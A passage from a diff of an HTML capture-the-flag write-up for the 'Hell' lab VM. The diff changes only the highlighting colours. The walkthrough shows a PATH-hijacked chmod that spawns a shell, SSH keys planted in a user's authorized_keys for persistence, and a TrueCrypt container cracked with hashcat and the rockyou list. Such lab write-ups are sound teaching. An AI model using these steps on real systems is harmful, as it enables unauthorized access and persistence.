-<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[I] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> ret<span style="color:#f92672">.</span>strip()
-<span style="color:#75715e"># start the game</span>
-<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[O] START&#39;</span>
-sock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;START</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># START the game</span>
-ret <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)   <span style="color:#75715e"># read 1024 bytes</span>
-<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[I] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> ret<span style="color:#f92672">.</span>strip()
+<span style="color:#6272a4"># start a socket</span>
+sock <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket()
+<span style="color:#6272a4"># connect locally</span>
+sock<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">1337</span>))
+ret <span style="color:#ff79c6">=</span> sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">1024</span>)   <span style="color:#6272a4"># read 1024 bytes</span>
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;[I] </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ret<span style="color:#ff79c6">.</span>strip()
+<span style="color:#6272a4"># start the game</span>
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;[O] START&#39;</span>
+sock<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">&#39;START</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>) <span style="color:#6272a4"># START the game</span>
+ret <span style="color:#ff79c6">=</span> sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">1024</span>)   <span style="color:#6272a4"># read 1024 bytes</span>
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;[I] </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ret<span style="color:#ff79c6">.</span>strip()
 
-<span style="color:#75715e"># Start reading the socket input and calculating answers sending them back</span>
-<span style="color:#66d9ef">while</span> True:
-   ret <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
-   <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[I] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> ret<span style="color:#f92672">.</span>strip()
+<span style="color:#6272a4"># Start reading the socket input and calculating answers sending them back</span>
+<span style="color:#ff79c6">while</span> True:
+   ret <span style="color:#ff79c6">=</span> sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">1024</span>)
+   <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;[I] </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ret<span style="color:#ff79c6">.</span>strip()
 
-   <span style="color:#75715e"># split by spaces</span>
-   ret <span style="color:#f92672">=</span> ret<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+   <span style="color:#6272a4"># split by spaces</span>
+   ret <span style="color:#ff79c6">=</span> ret<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)
 
-   <span style="color:#75715e"># a question line</span>
-   <span style="color:#66d9ef">if</span> ret[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Quick&#39;</span>:
-      <span style="color:#75715e"># extract the 2 integers from:</span>
-      <span style="color:#75715e"># [&#39;Quick&#39;, &#34;what&#39;s...&#34;, &#39;435&#39;, &#39;x&#39;, &#39;574?&#39;, &#39;&#39;]</span>
-      one <span style="color:#f92672">=</span> int(ret[<span style="color:#ae81ff">2</span>])
-      two <span style="color:#f92672">=</span> int(ret[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;?&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))   <span style="color:#75715e"># remove the comma</span>
-      answer <span style="color:#f92672">=</span> one <span style="color:#f92672">*</span> two
-      <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[O] Answer </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> answer
-      sock<span style="color:#f92672">.</span>send(str(answer) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+   <span style="color:#6272a4"># a question line</span>
+   <span style="color:#ff79c6">if</span> ret[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;Quick&#39;</span>:
+      <span style="color:#6272a4"># extract the 2 integers from:</span>
+      <span style="color:#6272a4"># [&#39;Quick&#39;, &#34;what&#39;s...&#34;, &#39;435&#39;, &#39;x&#39;, &#39;574?&#39;, &#39;&#39;]</span>
+      one <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(ret[<span style="color:#bd93f9">2</span>])
+      two <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(ret[<span style="color:#bd93f9">4</span>]<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;?&#39;</span>,<span style="color:#f1fa8c">&#39;&#39;</span>))   <span style="color:#6272a4"># remove the comma</span>
+      answer <span style="color:#ff79c6">=</span> one <span style="color:#ff79c6">*</span> two
+      <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;[O] Answer </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> answer
+      sock<span style="color:#ff79c6">.</span>send(<span style="color:#8be9fd;font-style:italic">str</span>(answer) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
 
-   <span style="color:#75715e"># once the 30 seconds passes, a line with Final will return. This</span>
-   <span style="color:#75715e"># is the end of the game</span>
-   <span style="color:#66d9ef">elif</span> ret[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Final&#39;</span>:
-      <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Done?&#39;</span>
-      sock<span style="color:#f92672">.</span>close()
-      sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+   <span style="color:#6272a4"># once the 30 seconds passes, a line with Final will return. This</span>
+   <span style="color:#6272a4"># is the end of the game</span>
+   <span style="color:#ff79c6">elif</span> ret[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;Final&#39;</span>:
+      <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;Done?&#39;</span>
+      sock<span style="color:#ff79c6">.</span>close()
+      sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
 
-   <span style="color:#75715e"># if we dont know what to do, just &#39;press enter&#39;</span>
-   <span style="color:#66d9ef">else</span>:
-      sock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-sock<span style="color:#f92672">.</span>close()
+   <span style="color:#6272a4"># if we dont know what to do, just &#39;press enter&#39;</span>
+   <span style="color:#ff79c6">else</span>:
+      sock<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+sock<span style="color:#ff79c6">.</span>close()
 </code></pre></div><p>I ran this in another session with <code>./game</code> running and won :P Once you win, the output results in:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!*!*!*!*! Congratulations, new high score <span style="color:#f92672">(</span>302785<span style="color:#f92672">)</span> !*!*!*!*!
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!*!*!*!*! Congratulations, new high score <span style="color:#ff79c6">(</span>302785<span style="color:#ff79c6">)</span> !*!*!*!*!
 
 I hear the faint sound of chmodding.......
 </code></pre></div><p>&hellip; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by <code>george</code> after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?</p>
 <p>To test, I fired up another editor on <code>chmod.py</code> and just put a line to echo test. I <code>chmod +x</code> this and moved the file to <code>/tmp</code>. I then added <code>/tmp</code> to <code>PATH</code> via <code>export PATH=/tmp:$PATH</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">milk_4_life@hell:~$ python chmod.py          <span style="color:#75715e"># test the script</span>
-Testing chmod exec
-milk_4_life@hell:~$ cp chmod.py /tmp/chmod   <span style="color:#75715e"># copy it to /tmp</span>
-milk_4_life@hell:~$ chmod +x /tmp/chmod      <span style="color:#75715e"># make it executable</span>
-milk_4_life@hell:~$ /tmp/chmod               <span style="color:#75715e"># test it</span>
-Testing chmod exec
-milk_4_life@hell:~$ export PATH<span style="color:#f92672">=</span>/tmp:$PATH   <span style="color:#75715e"># prefix PATH with /tmp</span>
-milk_4_life@hell:~$ chmod                    <span style="color:#75715e"># test it without full path</span>
-Testing chmod exec
-milk_4_life@hell:~$ ./game                   <span style="color:#75715e"># start the game</span>
-I<span style="color:#960050;background-color:#1e0010">&#39;</span>m listening
-Testing chmod exec                           <span style="color:#75715e"># profit :)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">milk_4_life@hell:~$ python chmod.py          <span style="color:#6272a4"># test the script</span>
+Testing chmod <span style="color:#8be9fd;font-style:italic">exec</span>
+milk_4_life@hell:~$ cp chmod.py /tmp/chmod   <span style="color:#6272a4"># copy it to /tmp</span>
+milk_4_life@hell:~$ chmod +x /tmp/chmod      <span style="color:#6272a4"># make it executable</span>
+milk_4_life@hell:~$ /tmp/chmod               <span style="color:#6272a4"># test it</span>
+Testing chmod <span style="color:#8be9fd;font-style:italic">exec</span>
+milk_4_life@hell:~$ <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">PATH</span><span style="color:#ff79c6">=</span>/tmp:<span style="color:#8be9fd;font-style:italic">$PATH</span>   <span style="color:#6272a4"># prefix PATH with /tmp</span>
+milk_4_life@hell:~$ chmod                    <span style="color:#6272a4"># test it without full path</span>
+Testing chmod <span style="color:#8be9fd;font-style:italic">exec</span>
+milk_4_life@hell:~$ ./game                   <span style="color:#6272a4"># start the game</span>
+I&#39;m listening
+Testing chmod <span style="color:#8be9fd;font-style:italic">exec</span>                           <span style="color:#6272a4"># profit :)</span>
 </code></pre></div><p>With it confirmed that <code>chmod</code> was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our <code>chmod</code> script to be slightly more useful:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
-<span style="color:#f92672">import</span> pty
-pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python</span>
+<span style="color:#ff79c6">import</span> pty
+pty<span style="color:#ff79c6">.</span>spawn(<span style="color:#f1fa8c">&#39;/bin/sh&#39;</span>)
 </code></pre></div><p>With this now in /tmp/chmod, I reran <code>./game.py</code>, and then <code>./play_game.py</code>. After 30 seconds on the session we started the game we had:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">milk_4_life@hell:~$ ./game
-I<span style="color:#960050;background-color:#1e0010">&#39;</span>m listening
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">milk_4_life@hell:~$ ./game
+I&#39;m listening
 $ id
-uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>george<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>george<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>george<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>george<span style="color:#ff79c6">)</span>,1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span>
 $
 </code></pre></div><p>Profit! We now have access to <code>george</code>&rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using <code>ssh-keygen</code>, and added the contents of the resultant <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code>. Whats important to note in the below snippet is that the full path of <code>chmod</code> is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ id
-uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>george<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>george<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span>
-$ cd /home/george
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ id
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>george<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>george<span style="color:#ff79c6">)</span>,1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span>
+$ <span style="color:#8be9fd;font-style:italic">cd</span> /home/george
 $ mkdir .ssh
-$ /bin/chmod <span style="color:#ae81ff">755</span> .ssh
-$ cd .ssh
-$ echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&#34;</span> &gt; authorized_keys
-$ /bin/chmod <span style="color:#ae81ff">600</span> authorized_keys
+$ /bin/chmod <span style="color:#bd93f9">755</span> .ssh
+$ <span style="color:#8be9fd;font-style:italic">cd</span> .ssh
+$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&#34;</span> &gt; authorized_keys
+$ /bin/chmod <span style="color:#bd93f9">600</span> authorized_keys
 </code></pre></div><p>Now we can SSH into the VM as <code>george</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh george@192.168.56.102 -i id_rsa
-Linux hell 3.2.0-4-486 <span style="color:#75715e">#1 Debian 3.2.57-3+deb7u2 i686</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh george@192.168.56.102 -i id_rsa
+Linux hell 3.2.0-4-486 <span style="color:#6272a4">#1 Debian 3.2.57-3+deb7u2 i686</span>
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+the exact distribution terms <span style="color:#ff79c6">for</span> each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 No mail.
-Last login: Sat Jul  <span style="color:#ae81ff">5</span> 19:26:25 <span style="color:#ae81ff">2014</span>
+Last login: Sat Jul  <span style="color:#bd93f9">5</span> 19:26:25 <span style="color:#bd93f9">2014</span>
 george@hell:~$
 </code></pre></div><h2 id="becoming-bazza">becoming bazza</h2>
 <p>George&rsquo;s home directory had what looked like a TrueCrypt container <code>4.0M Jun 19 21:09 container.tc</code> in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.</p>
 <p><code>george</code> also had mail in <code>/var/mail</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">george@hell:~$ cat /var/mail/george/signup.eml
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">george@hell:~$ cat /var/mail/george/signup.eml
 From: admin@rockyou.com
 To: super_admin@hell.com
 Subject: Account Activation
-Date: 13th November <span style="color:#ae81ff">2009</span>
+Date: 13th November <span style="color:#bd93f9">2009</span>
 
-Thanks <span style="color:#66d9ef">for</span> signing up <span style="color:#66d9ef">for</span> your account. I hope you enjoy our services.
+Thanks <span style="color:#ff79c6">for</span> signing up <span style="color:#ff79c6">for</span> your account. I hope you enjoy our services.
 george@hell:~$
 </code></pre></div><p>There is a mention of <em>rockyou</em> in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the <code>container.tc</code> to my Kali Linux install, and have <code>truecrack</code> have a go at it while I catch up on some much deserved sleep.</p>
 <h3 id="fast-forward-a-few-hours">fast forward a few hours</h3>
 <p>A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this <em>may</em> not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, <a href="http://hashcat.net/oclhashcat/">oclHashcat</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\S</span>omedude<span style="color:#ae81ff">\D</span>ownloads<span style="color:#ae81ff">\o</span>clHashcat-1.21<span style="color:#ae81ff">\o</span>clHashcat-1.21&gt;oclHashcat64.exe
--m <span style="color:#ae81ff">6211</span> C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\S</span>omedude<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\H</span>ell<span style="color:#ae81ff">\c</span>ontainer.tc C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\S</span>omedude<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\H</span>ell<span style="color:#ae81ff">\r</span>ockyou.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\S</span>omedude<span style="color:#f1fa8c">\D</span>ownloads<span style="color:#f1fa8c">\o</span>clHashcat-1.21<span style="color:#f1fa8c">\o</span>clHashcat-1.21&gt;oclHashcat64.exe
+-m <span style="color:#bd93f9">6211</span> C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\S</span>omedude<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\H</span>ell<span style="color:#f1fa8c">\c</span>ontainer.tc C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\S</span>omedude<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\H</span>ell<span style="color:#f1fa8c">\r</span>ockyou.txt
 
-<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>
+<span style="color:#ff79c6">[</span>snip<span style="color:#ff79c6">]</span>
 
-C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\S</span>omedude<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\H</span>ell<span style="color:#ae81ff">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
+C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\S</span>omedude<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\H</span>ell<span style="color:#f1fa8c">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
 
 Session.Name...: oclHashcat
 Status.........: Cracked
-Input.Mode.....: File <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\S</span>omedude<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\H</span>ell<span style="color:#ae81ff">\r</span>ockyou.txt<span style="color:#f92672">)</span>
-Hash.Target....: File <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\S</span>omedude<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\H</span>ell<span style="color:#ae81ff">\c</span>ontainer.tc<span style="color:#f92672">)</span>
+Input.Mode.....: File <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\S</span>omedude<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\H</span>ell<span style="color:#f1fa8c">\r</span>ockyou.txt<span style="color:#ff79c6">)</span>
+Hash.Target....: File <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\S</span>omedude<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\H</span>ell<span style="color:#f1fa8c">\c</span>ontainer.tc<span style="color:#ff79c6">)</span>
 Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
-Time.Started...: Sun Jul <span style="color:#ae81ff">20</span> 14:26:08 <span style="color:#ae81ff">2014</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">19</span> secs<span style="color:#f92672">)</span>
-Speed.GPU.#1...:    <span style="color:#ae81ff">14578</span> H/s
-Speed.GPU.#2...:    <span style="color:#ae81ff">16165</span> H/s
-Speed.GPU.#*...:    <span style="color:#ae81ff">30743</span> H/s
-Recovered......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Salts
-Progress.......: 563201/14343297 <span style="color:#f92672">(</span>3.93%<span style="color:#f92672">)</span>
-Skipped........: 0/563201 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
-Rejected.......: 1/563201 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+Time.Started...: Sun Jul <span style="color:#bd93f9">20</span> 14:26:08 <span style="color:#bd93f9">2014</span> <span style="color:#ff79c6">(</span><span style="color:#bd93f9">19</span> secs<span style="color:#ff79c6">)</span>
+Speed.GPU.#1...:    <span style="color:#bd93f9">14578</span> H/s
+Speed.GPU.#2...:    <span style="color:#bd93f9">16165</span> H/s
+Speed.GPU.#*...:    <span style="color:#bd93f9">30743</span> H/s
+Recovered......: 1/1 <span style="color:#ff79c6">(</span>100.00%<span style="color:#ff79c6">)</span> Digests, 1/1 <span style="color:#ff79c6">(</span>100.00%<span style="color:#ff79c6">)</span> Salts
+Progress.......: 563201/14343297 <span style="color:#ff79c6">(</span>3.93%<span style="color:#ff79c6">)</span>
+Skipped........: 0/563201 <span style="color:#ff79c6">(</span>0.00%<span style="color:#ff79c6">)</span>
+Rejected.......: 1/563201 <span style="color:#ff79c6">(</span>0.00%<span style="color:#ff79c6">)</span>
 HWMon.GPU.#1...: 64% Util, 54c Temp, 43% Fan
 HWMon.GPU.#2...:  0% Util, 90c Temp, 100% Fan
 
-Started: Sun Jul <span style="color:#ae81ff">20</span> 14:26:08 <span style="color:#ae81ff">2014</span>
-Stopped: Sun Jul <span style="color:#ae81ff">20</span> 14:26:42 <span style="color:#ae81ff">2014</span>
+Started: Sun Jul <span style="color:#bd93f9">20</span> 14:26:08 <span style="color:#bd93f9">2014</span>
+Stopped: Sun Jul <span style="color:#bd93f9">20</span> 14:26:42 <span style="color:#bd93f9">2014</span>
 </code></pre></div><p>About 19 seconds later, we have the password thanks to hashcat!</p>
 <p>So, lets mount the container and see whats inside:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">george@hell:~$ truecrypt container.tc
-Enter mount directory <span style="color:#f92672">[</span>default<span style="color:#f92672">]</span>:
-Enter password <span style="color:#66d9ef">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
-Enter keyfile <span style="color:#f92672">[</span>none<span style="color:#f92672">]</span>:
-Protect hidden volume <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> any<span style="color:#f92672">)</span>? <span style="color:#f92672">(</span>y<span style="color:#f92672">=</span>Yes/n<span style="color:#f92672">=</span>No<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>No<span style="color:#f92672">]</span>:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">george@hell:~$ truecrypt container.tc
+Enter mount directory <span style="color:#ff79c6">[</span>default<span style="color:#ff79c6">]</span>:
+Enter password <span style="color:#ff79c6">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
+Enter keyfile <span style="color:#ff79c6">[</span>none<span style="color:#ff79c6">]</span>:
+Protect hidden volume <span style="color:#ff79c6">(</span><span style="color:#ff79c6">if</span> any<span style="color:#ff79c6">)</span>? <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">y</span><span style="color:#ff79c6">=</span>Yes/n<span style="color:#ff79c6">=</span>No<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>No<span style="color:#ff79c6">]</span>:
 
-george@hell:~$ cd /media/truecrypt1/
+george@hell:~$ <span style="color:#8be9fd;font-style:italic">cd</span> /media/truecrypt1/
 george@hell:/media/truecrypt1$ ls -lah
 total 22K
-drwx------ <span style="color:#ae81ff">2</span> george george  16K Jan  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">1970</span> .
